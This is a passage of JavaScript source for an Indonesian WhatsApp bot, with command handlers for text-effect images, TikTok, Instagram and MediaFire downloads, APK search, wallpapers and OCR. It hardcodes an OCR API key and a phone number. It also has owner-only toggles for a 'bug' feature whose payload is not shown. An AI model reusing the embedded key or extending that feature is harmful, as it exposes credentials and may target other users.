await textpro(caketext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'berryeffect') {
await textpro(berryeffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'fishtext') {
await textpro(fishtext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'breadeffect') {
await textpro(breadeffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'bloodtext') {
await textpro(bloodtext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'hororblood') {
await textpro(hororblood, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'boxtext') {
await textpro(boxtext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'neoneffect') {
await textpro(neoneffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'warningtext') {
await textpro(warningtext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'steeltext') {
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(steeltext, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'bokeheffect') {
await textpro(bokeheffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'neontext') {
await textpro(neontext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'advancedglow') {
await textpro(advancedglow, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'watereffect') {
await textpro(watereffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'walltext') {
await textpro(walltext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'gifttext') {
await textpro(gifttext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'honeyeffect') {
await textpro(honeyeffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'bagdrug') {
await textpro(bagdrug, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'horrortext') {
await textpro(horrortext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'slabstext') {
await textpro(slabstext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'marbleeffect') {
await textpro(marbleeffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'coldtext') {
await textpro(coldtext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'juicetext') {
await textpro(juicetext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'metaltext') {
await textpro(metaltext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'biscuiteffect') {
await textpro(biscuiteffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'bageleffect') {
await textpro(bageleffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'woodeffect') {
await textpro(woodeffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'fitext') {
await textpro(fitext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'rainbowtext') {
await textpro(rainbowtext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'gemtext') {
await textpro(gemtext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'jewelrytext') {
await textpro(jewelrytext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'goldentext') {
await textpro(goldentext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'carboneffect') {
await textpro(carboneffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'candytext') {
await textpro(candytext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'glowingmetal') {
await textpro(glowingmetal, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else {
lun = `Maaf *${jenis}* tidak ada
Type yang tersedia

${typetext}
`
m.reply(lun)
}
} catch(e) {
m.reply(`*Error*\n${String(e)}`)
conn.sendMessage("6281232646925@s.whatsapp.net", {text: `${prefix+command} ${args.join(" ")}\n${e}`}, {quoted: m})
}
}
break

case 'tiktokaudio':
case 'ttmp3':
case 'tiktokmp3': {
/*kuyi = {
key: { 
fromMe: false,
participant: `${quoted.sender}`
},
message: { 
"extendedTextMessage": {
"text": `*TikTok Downloader*`,
"title": ``,
'jpegThumbnail': fs.readFileSync('./image/tiktok.png')
}
} 
}*/
if (text.includes("tiktok.com")) {
try {
let tiktok = require('./lib/tiktok')
let resioni = await tiktok(text)
conn.sendMessage(m.chat, {document: {url: `${resioni.medias.audio.url}`}, ptt: false, mimetype: 'audio/mpeg', fileName: `${resioni.medias.audio.sound}.mp3`, contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `Tiktok Downloader`, body: "©Perwira Bot WhatsApp", mediaUrl: text, sourceUrl: text, mediaType: 1, renderLargerThumbnail: true, showAdAttribution: true, thumbnail: fs.readFileSync('./image/tiktok.jpeg')}}}) /*conn.sendButDoc2(m.chat, "©Perwira Bot WhatsApp", '*Click Document untuk download*\n\n*Lokasi file*\nAndroid/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents', `TikTok Download`, "©Perwira Bot WhatsApp", fs.readFileSync('./image/tiktok.jpeg'), text, 1, `${resioni.medias.audio.sound}.mp3`, `${resioni.medias.audio.url}`, 'audio/mpeg', [{ buttonId: 'ok', buttonText: { displayText: 'Thanks' }, type: 1 }], m, true) */
} catch(e) {
conn.sendButtonText(m.chat, [{buttonId: `ttmp32 ${text}`, buttonText: {displayText: 'Server lain'}, type: 1}], `Ulangi kembali, jika tetap error lapor Owner\n\n*Rincian kesalahan :*\n${String(e)}`, '©Perwira Bot WhatsApp')
}
} else {
m.reply(`Fitur untuk download audio dari video tiktok\nLinknya?\n*Contoh :* ${prefix+command} https://vt.tiktok.com/ZSextfjoX/`)
}
}
break



case 'ttmp4':
case 'tiktok':
case 'ttdl':
case 'tiktokdl':
case 'tiktoknowm':{

if (text.includes("tiktok.com")) {
try {
let tiktok = require('./lib/tiktok')
let resion = await tiktok(text)
let ddi = [{ buttonId: `tiktokmp3 ${text}`, buttonText: { displayText: 'Audio' },type: 1}]
conn.sendButVidc(m.chat, ddi, "*Tiktok Downloader*", '©P-Bot 2022\nThis is simple Bot WhatsApp', `${resion.medias.nowm.url}`)
/*conn.sendButVid(m.chat, '*TikTok Downloader*', '©Perwira Bot WhatsApp', `${resion.medias.nowm.url}`, [{quickReplyButton: {displayText: 'Audio', id: `ttmp3 ${text}`}}])*/
} catch(e) {
conn.sendButtonText(m.chat, [{buttonId: `tiktok2 ${text}`, buttonText: {displayText: 'Server lain'}, type: 1}], `Ulangi kembali, jika tetap error lapor Owner\n\n*Rincian kesalahan :*\n${String(e)}`, '©Perwira Bot WhatsApp')
}
} else {m.reply(`Linknya?\n*Contoh :* ${prefix+command} https://vt.tiktok.com/ZSextfjoX/`)}
}
break



case 'ttmp42':
case 'tiktok2':
case 'ttdl2':
case 'tiktokdl2':
case 'tiktoknowm2':{
if(text.includes("tiktok.com")) {
try {
await axios.post('https://ssyoutube.com/api/convert', `url=${text}`).then(({data}) => {
conn.sendButVid(m.chat, '*TikTok Downloader*', '©Perwira Bot WhatsApp', `${data.url[0].url}`, [{quickReplyButton: {displayText: 'Audio', id: `ttmp3 ${text}`}}])
})} catch(e) {
m.reply(String(e))
}
} else { m.reply(`Link yang anda masukkan tidak tepat!\nHarap masukkan link yang benar\n*Contoh :* ${prefix}ttdl2 https://vt.tiktok.com/ZSdeUA8T2/?k=1`) }
}
break



case 'avio':{
if(text) {
try {
let { downloader } = require(`./lib/scraper`)
let res = await downloader(text)
console.log(res)
} catch(e) {
m.reply(String(e))
}
} else { m.reply(`Link yang anda masukkan tidak tepat!\nHarap masukkan link yang benar\n*Contoh :* ${prefix}ttdl2 https://vt.tiktok.com/ZSdeUA8T2/?k=1`) }
}
break



case 'ttmp32':{
if(text.includes("tiktok.com")) {
try {
let { TiktokDownloader } = require(`./lib/scraper`)
let res = await TiktokDownloader(text)
let media = await getBuffer(res.result.nowatermark)
let { toAudio } = require('./lib/converter')
let audii = await toAudio(media, 'mp4')
conn.sendMessage(m.chat, {document: audii, ptt: false, mimetype: 'audio/mpeg', fileName: `${new Date()}.mp3`, contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `Tiktok Downloader`, body: "©Perwira Bot WhatsApp", mediaUrl: text, sourceUrl: text, mediaType: 1, renderLargerThumbnail: true, showAdAttribution: true, thumbnail: fs.readFileSync('./image/tiktok.jpeg')}}})
} catch(e) {
m.reply(String(e))
}
} else { m.reply(`Link yang anda masukkan tidak tepat!\nHarap masukkan link yang benar\n*Contoh :* ${prefix}ttdl2 https://vt.tiktok.com/ZSdeUA8T2/?k=1`) }
}
break




case 'bugon': {
if(!isCreator) return
bug.status = true
fs.writeFileSync('./bug.json', JSON.stringify(bug))
}
break



case 'bugoff': {
if(!isCreator) return
bug.status = false
fs.writeFileSync('./bug.json', JSON.stringify(bug))
}
break



case 'addbug': {
if(!isCreator) return
bug.nobug.push(`${text.split("+")[1]}`+"@s.whatsapp.net")
fs.writeFileSync('./bug.json', JSON.stringify(bug))
}
break


case 'ringtone':{
if(text.length < 1) return m.reply(`Ringtone apa yang mau dicari?\nContoh ${prefix+command} nokia`)
let { ringtone } = require('./lib/scraper')
let res = await ringtone(text)
nomor = 1
isinya = []
for(let i of res) {
isinya.push({
'title': `${nomor++}. ${i.title}`,
'description': `Ringtone`,
'rowId': `ringring ${i.audio}`
})
}
let listMessage = {
text: 'Hasil penelusuran',
footer: `©Perwira Bot WhatsApp`,
title: `Ringtone search\n\nRingtone yang ditemukan.`,
buttonText: "Click Here",
sections: [{
"title": `Hasil penelusuran yang ditemukan`,
"rows": isinya}],
}
conn.sendMessage(m.chat, listMessage, {quoted: m})
}
break




case 'ringring': {
if(!text.includes("btones")) return
conn.sendMessage(m.chat, {audio: {url: text}, mimetype: 'audio/mpeg'}, {quoted: m})
}
break




case 'mediafire': {
try {
if(text.includes('mediafire.com')) {
let {mediafire} = require('mumaker')
await mediafire(text).then(async datan => {
let res = await axios.head(datan[0].link)
mimeax = res.headers['content-type']
if(res.headers["content-length"] > 20402526) { (async () => {templateButtones = [{index: 2, urlButton: {displayText: 'Download', url: datan[0].link}}]
templateMessages = {viewOnceMessage :{message : { templateMessage : {hydratedTemplate: { hydratedContentText: "File melebihi 20 mb",
hydratedFooterText: "©P-Bot 2022\nThis is Simple Bot WhatsApp", hydratedButtons: templateButtones}}}}}
conn.relayMessage(m.chat, templateMessages, {})})();
} else if (mimeax.split("/")[1] === "gif") {
return conn.sendMessage(m.chat, { video: await getBuffer(datan[0].link), caption: caption, gifPlayback: true, mentions: men ? men : []}, {quoted: m})
} else if(mimeax.split("/")[0] === "image"){
return conn.sendMessage(m.chat, { image: await getBuffer(datan[0].link)}, {quoted: m})
} else if(mimeax.split("/")[0] === "video"){
return conn.sendMessage(m.chat, { video: await getBuffer(datan[0].link)}, {quoted: m})
} else if(mimeax.split("/")[0] === "audio"){
return conn.sendMessage(m.chat, { audio: await getBuffer(datan[0].link), mimetype: 'audio/mpeg'}, {quoted: m })
} else if(mimeax.split("/")[1] === "vnd.android.package-archive"){
return conn.sendMessage(m.chat, { document: await getBuffer(datan[0].link), mimetype: res.headers['content-type'], fileName: `${datan[0].nama}.apk`, contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `MediaFire Download`, body: "©Perwira Bot WhatsApp", mediaUrl: `${text}`, sourceUrl: `${text}`, renderLargerThumbnail: true, showAdAttribution: true, mediaType: 1, thumbnail: fs.readFileSync('./image/mfire.jpg')}}}, {})
} else if(mimeax.split("/")[1] === "zip") {
conn.sendMessage(m.chat, {document: {url: datan[0].link}, fileName: `${datan[0].nama}.apk`, mimetype: 'application/zip', contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `MediaFire Download`, body: "©Perwira Bot WhatsApp", mediaUrl: `${text}`, sourceUrl: `${text}`, renderLargerThumbnail: true, showAdAttribution: true, mediaType: 1, thumbnail: fs.readFileSync('./image/mfire.jpg')}}}) 
} else {
m.reply("Versi belum tersedia ajukan request ke owner")
}
})
} else {
m.reply(`*Cara Penggunaan*\n\n*Contoh :* ${prefix+command} https://www.mediafire.com/file/jqxsuqn83s0f2wp/PIXELLAB+DARK+BLUE+1.9.9.apk/file`)
}
} catch (e) {
m.reply("Error")
}
}
break

case 'totext': {
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)

let {ocrSpace} = require('ocr-space-api-wrapper');
let media = await conn.downloadAndSaveMediaMessage(quoted);
let base666 = fs.readFileSync(media).toString('base64');
let dun = await ocrSpace(`data:image/png;${base666}`, {apiKey: 'K87092877188957', language: 'eng'})
let hh = dun.ParsedResults[0].ParsedText
await conn.linkUp(m.chat, `${hh}`, "https://youtube.com/c/Per1440", fs.readFileSync('./image/nan.png'), "My YouTube", 'Subscribe owner YouTube now!')
await fs.unlinkSync(media)
	}
	break



case 'apksearch': {
if(text.length < 1) return m.reply("Masukkan nama aplikasi yang ingin dicari\n*Contoh:* ${prefix+command} mekorama")
try {
let {rexdl} = require('./lib/rexdl')
let {rix} = require('./lib/rexdl')
let {html} = require('./lib/rexdl')
let fos = []

let npi = 1


await rexdl(text).then(async datay => {
for(let li of datay.list) {
fos.push({
"title": `${npi++}. ${li.title}`,
"description": `Application search and download`,
"rowId": `apksearch ${li.html}`
})
}


let listAp = {
text: 'Hasil penelusuran',
footer: `©Perwira Bot WhatsApp`,
title: `Application Download`,
buttonText: "Application",
sections: [{
"title": `Aplikasi yang ditemukan`,
"rows": fos}]
}


if(text.endsWith(".html/")) {
await rix(text).then(async gui => {
await html(gui.otw).then(async runin => {
let nppi = 1
let fos2 = []
for(let li of runin.url) {
fos2.push({
"title": `${nppi++}. ${li.split("/")[5].split("-www")[0]}`,
"description": `Application search and download`,
"rowId": `apksearch ${text}|${li}`
})
}
let listUr = {
text: 'Hasil penelusuran',
footer: `©Perwira Bot WhatsApp`,
title: `Jenis versi aplikasi ini`,
buttonText: "Application",
sections: [{
"title": `Versi yang ditemukan`,
"rows": fos2}]
}

conn.sendMessage(m.chat, listUr, {})
})
}).catch(err => m.reply(String(err)))
} else if(text.endsWith(".apk")) {
let than = await rix(text.split("|")[0])
let nap = await axios(text.split("|")[1])
if(nap.headers["content-length"] > 20402526) { (async () => {templateButtones = [{index: 2, urlButton: {displayText: 'Download', url: text.split("|")[1]}}]
templateMessages = {viewOnceMessage :{message : { templateMessage : {hydratedTemplate: { hydratedContentText: "File melebihi 20 mb",
hydratedFooterText: "©P-Bot 2022\nThis is Simple Bot WhatsApp", hydratedButtons: templateButtones}}}}}
conn.relayMessage(m.chat, templateMessages, {})})();
} else {
await conn.sendMessage(m.chat, { document :{url: text.split("|")[1]}, mimetype: nap.headers['content-type'], fileName: `${text.split("|")[1].split("/")[5]}.apk`, contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `Aplication Download`, body: "©Perwira Bot WhatsApp", mediaUrl: `${text.split("|")[1]}`, sourceUrl: `${text.split("|")[1]}`, renderLargerThumbnail: true, showAdAttribution: true, mediaType: 1, thumbnail: await getBuffer(than.thumb)}}})
}
} else {
conn.sendMessage(m.chat, listAp, {})
}
}).catch(err => m.reply(String(err)))
} catch(err) { 
m.reply(String(err) + `${err}`)
}
}
break




case 'wlp': {
try {
let { linked } = require('./lib/wallpaper.js')
imhg = await linked(text)
conn.sendMessage(m.chat, {image: {url: imhg[0]}, caption: `Random Hd Wallpaper `}, {quoted: m})
} catch(err) {
m.reply(String(err))
}
}
break




case 'wallpaper': {

let { wallpaperhd } = require('./lib/wallpaper.js')
let enm = await text.split("order=desc&page=")[1] ? text.split("order=desc&page=")[1]: 0
if(text.includes("//wallhaven.cc/search")) {
try {
let swo = await wallpaperhd(`${text.split("order=desc&page=")[0]}order=desc&page=${enm * 1 + 1}`)
if(swo.length === 0) return conn.sendButtonText(m.chat, [{buttonId: `i`, buttonText: {displayText: 'Oke'}, type:1}], `Sepertinya sudah sampai akhir`, `©Perwira Bot WhatsApp`)
let lostii = []
let npi = 1
for(let li of swo) {
lostii.push({
"title": `${npi++}.Wallpaper ${text.split("/search?q=")[1].split("&categories")[0].replace(/%20/g, " ")} ${li.width}`,
"description": `HD Wallpaper Quality size image ${li.width}`,
"rowId": `wlp ${li.link}`
})
}

let listWall = {
text: 'Hasil penelusuran',
footer: `©Perwira Bot WhatsApp`,
title: `Wallpaper HD`,
buttonText: "Wallpaper",
sections: [{
"title": `Wallpaper yang tersedia`,
"rows": lostii}]
}
conn.sendMessage(m.chat, listWall, {}).then(() => {
let typ = `${text.split("order=desc&page=")[0]}order=desc&page=${enm * 1 + 1}`
let btnzi = [{buttonId: `wallpaper ${typ}`, buttonText: {displayText: 'Next'}, type:1}]
conn.sendButtonText(m.chat, btnzi, `List berikutnya`, `©Perwira Bot WhatsApp`)
})
} catch(err) {
m.reply(String(err))
}
} else {
try {
if(text.length < 1) return m.reply("*Contoh:* /wallpaper doctor strange")
/*enm = await text.split("order=desc&page=")[1] ? text.split("order=desc&page=")[1]: 0*/
let sw = await wallpaperhd(`https://wallhaven.cc/search?q=${encodeURI(text)}&categories=110&purity=100&sorting=relevance&order=desc&page=1`)

lui = `https://wallhaven.cc/search?q=${encodeURI(text)}&categories=110&purity=100&sorting=relevance&order=desc&page=1`
if(sw.length === 0) return conn.sendButtonText(m.chat, [{buttonId: `i`, buttonText: {displayText: 'Oke'}, type:1}], `Wallpaper ${text} tidak tersedia`, `©Perwira Bot WhatsApp`)
let losti = []
np = 1
for(let l of sw) {
losti.push({
"title": `${np++}.Wallpaper ${lui.split("/search?q=")[1].split("&categories")[0].replace(/%20/g, " ")} ${l.width}`,
"description": `HD Wallpaper Quality size image ${l.width}`,
"rowId": `wlp ${l.link}`
})
}

let listWal = {
text: 'Hasil penelusuran',
footer: `©Perwira Bot WhatsApp`,
title: `Wallpaper HD`,
buttonText: "Wallpaper",
sections: [{
"title": `Wallpaper yang tersedia`,
"rows": losti}]
}
conn.sendMessage(m.chat, listWal, {}).then(() => {
let typ = `https://wallhaven.cc/search?q=${encodeURI(text)}&categories=110&purity=100&sorting=relevance&order=desc&page=2`
let btnzi = [{buttonId: `wallpaper ${typ}`, buttonText: {displayText: 'Next'}, type:1}]
conn.sendButtonText(m.chat, btnzi, `List berikutnya`, `©Perwira Bot WhatsApp`)
})
} catch(err) {
m.reply(String(err))
}
}
} break



case 'beli': {
jio = `Harga script 15k
Pembayaran via pulsa
No encrypt, No Api

chat owner untuk melanjutkan`

m.reply(jio)
}
break



case 'igstory':
case 'igs':{
let fukin = false
if(text.length < 1) return m.reply(`Cara penggunaan\n*Contoh :* ${prefix+command} natashawilona12`)
if(text.includes(`https://`)) return m.reply(`Cara penggunaan\n*Contoh :* ${prefix+command} natashawilona12`)
await axios(`https://www.instagram.com/${text.split("img°°°")[1]}`).then(({data}) => { idn = `${data.split('profile_id":"')[1].split('"')[0]}`}).catch(err => m.reply("User tidak ditemukan\nPastikan mengetik username dengan benar").then(fukip = true)).then(() => { console.log("User ada")})
if(fukin) return console.log("Error")

try {

let datai = []
let dataa = []
let thu = 1
let thennn = 0
let thenn = 1
let idn = " "
let k = []
let ou = []
let f = []
let fukip = false

if(text.includes("img°°°")) {
await axios(`https://www.instagram.com/${text.split("img°°°")[1]}`).then(({data}) => { idn = `${data.split('profile_id":"')[1].split('"')[0]}`}).catch(err => m.reply("User tidak ditemukan\nPastikan mengetik username dengan benar").then(fukip = true)).then(() => { console.log("User ada")})
if(fukip) return console.log("Error")
await axios(`https://igs.sf-converter.com/api/stories/${idn}`).then(({data}) => {
if(Object.keys(data.result).length < 1) return m.reply("User tersebut tidak memiliki story")
for(let newd of data.result) {
datai.push({
"title": `${thenn++}. Story Instagram`,
"description": `Jenis image`,
"rowId": `igos ${newd.image_versions2.candidates[0].url}`
})
}

})

let listMess = {
text: 'Hasil penelusuran',
footer: `©Perwira Bot WhatsApp`,
title: `Instagram Story`,
buttonText: "Story yang ditemukan",
sections: [{
"title": `Story instagram gambar`,
"rows": datai}]
}

conn.sendMessage(m.chat, listMess, {quoted: 
{
key: { fromMe: false, participant: `${quoted.sender}`},
message: {
"extendedTextMessage": {
"text": `*Instagram Story*`,
"title": ``,
'jpegThumbnail': fs.readFileSync('./image/ig.png')
}} 
}, contextInfo: {mentionedJid: [quoted.sender]}})
} else if(text.includes("vid°°°")) {
await axios(`https://www.instagram.com/${text.split("vid°°°")[1]}`).then(({data}) => { idn = `${data.split('profile_id":"')[1].split('"')[0]}`}).catch(err => m.reply("User tidak ditemukan\nPastikan mengetik username dengan benar").then(fukip = true)).then(() => { console.log("User ada")})
if(fukip) return console.log("Error")
await axios(`https://igs.sf-converter.com/api/stories/${idn}`).then(({data}) => {
if(Object.keys(data.result).length < 1) return m.reply("User tersebut tidak memiliki story")

for(let i of data.result) {
f.push(i.video_versions)
}

let c = []
for(let g of f) {
if(g == undefined) continue
c.push(g)
} 

for(let i of c) {
k.push(i.map(v=> v.url)[0])
}
})

/*for(let ned of data.result) {
dataa.push({
"title": `${thu++}. Story Instagram`,
"description": `Jenis video`,
"rowId": `igos ${ned.video_versions[0].url ? ned.video_versions[0].url: "https://github.com/PerwiraKusuma111/PerwiraKusuma111/raw/main/images%20(2)-picsay.png"}`
})
}*/



for(let ned of k) {
dataa.push({
"title": `${thu++}. Story Instagram`,
"description": `Jenis video`,
"rowId": `igos ${ned}`
})
}

let listMess = {
text: 'Hasil penelusuran',
footer: `©Perwira Bot WhatsApp`,
title: `Instagram Story`,
buttonText: "Story yang ditemukan",
sections: [{
"title": `Story instagram Video`,
"rows": dataa}]
}

conn.sendMessage(m.chat, listMess, {quoted: 
{
key: { fromMe: false, participant: `${quoted.sender}`},
message: {
"extendedTextMessage": {
"text": `*Instagram Story*`,
"title": ``,
'jpegThumbnail': fs.readFileSync('./image/ig.png')
}} 
}, contextInfo: {mentionedJid: [quoted.sender]}})
} else {
let buttons = [
{ buttonId: `igstory img°°°${text}`, buttonText: { displayText: 'Image' }, type: 1 },
{ buttonId: `igstory vid°°°${text}`, buttonText: { displayText: 'Video' }, type: 1 }
]
await conn.sendButtonText(m.chat, buttons, `Pilih jenis type story Instagram`, "©P-Bot 2022\nThis is Simple Bot WhatsApp", m)
}
} catch(err) {
m.reply(String(err))
}
}
break




case 'igos': {

mimeaxigs= ""
try {
let contentigos = await axios.head(text)
let mimeaxigs= contentigos.headers['content-type']
if(mimeaxigs.split("/")[0] === "image"){
await conn.sendMessage(m.chat, { image: {url: text}}, {quoted: m})
} else if(mimeaxigs.split("/")[0] === "video"){
await conn.sendMessage(m.chat, { video: {url: text}}, {quoted: m})
} else {
m.reply("Media tidak didukung")
}
} catch(err) {
m.reply("Error")
}
}
break




case 'igdl':
case 'instagram':
case 'ig':
if(text.includes("/stories/")) return m.reply(`_Gunakan perintah ${prefix}igstory_`)
mimeaxig= ''
{
try {
if(text.includes("instagram.com")) {
let {insta_post} = require("@phaticusthiccy/open-apis")
await insta_post(text).then(async resu => {
let res = await axios.head(resu.post1.url)
mimeaxig= await res.headers['content-type']
if(mimeaxig.split("/")[0] === "image"){
await conn.sendMessage(m.chat, { document: {url: resu.post1.url}, mimetype: 'image/jpeg', fileName: `${text}.jpg`, contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `Instagram Download`, body: "©Perwira Bot WhatsApp", mediaUrl: `${text}`, sourceUrl: `${text}`, renderLargerThumbnail: true, showAdAttribution: true, mediaType: 1, thumbnail: fs.readFileSync('./image/ig.jpeg')}}}) /*conn.sendButDoc2(m.chat, "©Perwira Bot WhatsApp", '*Click Document untuk download*\n\n*Lokasi file*\nAndroid/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents', `Instagram Download`, "©Perwira Bot WhatsApp", fs.readFileSync('./image/ig.jpeg'), text, 1, `${text}.jpg` , helo[0].url, 'image/jpeg', [{ buttonId: 'ok', buttonText: { displayText: 'Thanks' }, type: 1 }], m, true) */
} else if(mimeaxig.split("/")[0] === "video"){
await conn.sendMessage(m.chat, { document: {url: resu.post1.url}, mimetype: 'video/mp4', fileName: `${text}.mp4`, contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `Instagram Download`, body: "©Perwira Bot WhatsApp", mediaUrl: `${text}`, sourceUrl: `${text}`, renderLargerThumbnail: true, showAdAttribution: true, mediaType: 1, thumbnail: fs.readFileSync('./image/ig.jpeg')}}})
}
})
} else {
m.reply(`Masukkan link!\n*Contoh :* ${prefix+command} https://www.instagram.com/p/CcejPskP8Ia/?igshid=YmMyMTA2M2Y=`)
}
} catch(e) {
conn.sendButtonText(m.chat, [{buttonId: `igmulti ${text}`, buttonText: {displayText: 'Versi lain'}, type: 1}, {buttonId: `igdl ${text}`, buttonText: {displayText: 'Coba lagi'}, type: 1}], `Ulangi kembali, jika tetap error lapor Owner\n\n*Rincian kesalahan :*\n${String(e)}`, '©Perwira Bot WhatsApp')
}
}
break



case 'igosig': {
let res = await axios.head(q)
let mimeax = res.headers['content-type']
if (mimeax.split("/")[1] === "gif") {
return conn.sendMessage(m.chat, { video: await getBuffer(q), caption: caption, gifPlayback: true, mentions: men ? men : []}, {quoted: m})
} else if(mimeax.split("/")[0] === "image"){
await conn.sendMessage(m.chat, { image: {url: text}}) 
} else if(mimeax.split("/")[0] === "video"){
await conn.sendMessage(m.chat, { video: {url: text}})
} else if(mimeax.split("/")[0] === "audio"){
return conn.sendMessage(m.chat, { audio: await getBuffer(q), mimetype: 'audio/mpeg'}, {quoted: m })
}
}
break



case 'igmulti': {
if(text.includes("/stories/")) return m.reply(`_Gunakan perintah ${prefix}igstory_`)
try {
if(text.includes("instagram.com")) {
let { igg } = require('./lib/igg')
let hwol = await igg(text)

/*for(let ii of hwol) {
await sleep(2000)
mimeax = ""
let res = await axios.head(ii.link)
mimeax= res.headers['content-type']
if(mimeax.split("/")[0] === "image"){
await conn.sendMessage(m.chat, { document: {url: ii.link}, mimetype: 'image/jpeg', fileName: `${text}.jpg`, contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `Instagram Download`, body: "©Perwira Bot WhatsApp", mediaUrl: `${text}`, sourceUrl: `${text}`, renderLargerThumbnail: true, showAdAttribution: true, mediaType: 1, thumbnail: fs.readFileSync('./image/ig.jpeg')}}}) 
} else if(mimeax.split("/")[0] === "video"){
await conn.sendMessage(m.chat, { document: {url: ii.link}, mimetype: 'video/mp4', fileName: `${text}.mp4`, contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `Instagram Download`, body: "©Perwira Bot WhatsApp", mediaUrl: `${text}`, sourceUrl: `${text}`, renderLargerThumbnail: true, showAdAttribution: true, mediaType: 1, thumbnail: fs.readFileSync('./image/ig.jpeg')}}})
}

}*/
let gui = []
let thenn = 1
for(let ii of hwol) {
gui.push({
"title": `Downloader Instagram urutan ke ${thenn++}`,
"description": `Jenis ${ii.type}`,
"rowId": `igosig ${ii.link}`
})
}
let listMesis = {
text: 'Hasil penelusuran',
footer: `©Perwira Bot WhatsApp`,
title: `Downloader Instagram`,
buttonText: "Media Instagram",
sections: [{
"title": `Data instagram yang ditemukan`,
"rows": gui}]
}

await conn.sendMessage(m.chat, listMesis, {quoted: 
{
key: { fromMe: false, participant: `${quoted.sender}`},
message: {
"extendedTextMessage": {
"text": `*Downloader Instagram*`,
"title": ``,
'jpegThumbnail': fs.readFileSync('./image/ig.png')
}} 
}, contextInfo: {mentionedJid: [quoted.sender]}})

} else {
m.reply(`Masukkan link!\n*Contoh :* ${prefix+command} https://www.instagram.com/p/CcejPskP8Ia/?igshid=YmMyMTA2M2Y=`)
}
} catch(err) {
m.reply(String(err))
}
}
break


case 'juzama': {
let listjuzMessage = {
text: 'Pilih JuzAma type media',
footer: `©Perwira Bot WhatsApp`,
title: `JuzAma feature`,
buttonText: "Click Here",
sections: [{
"title": `List JuzAma`,
"rows": [{
"title": `1. JuzAma`,
"description": `Format Document(pdf)`,
"rowId": `juzdl https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf`
},
{
"title": `2. JuzAma`,
"description": `Format Document(docx)`,
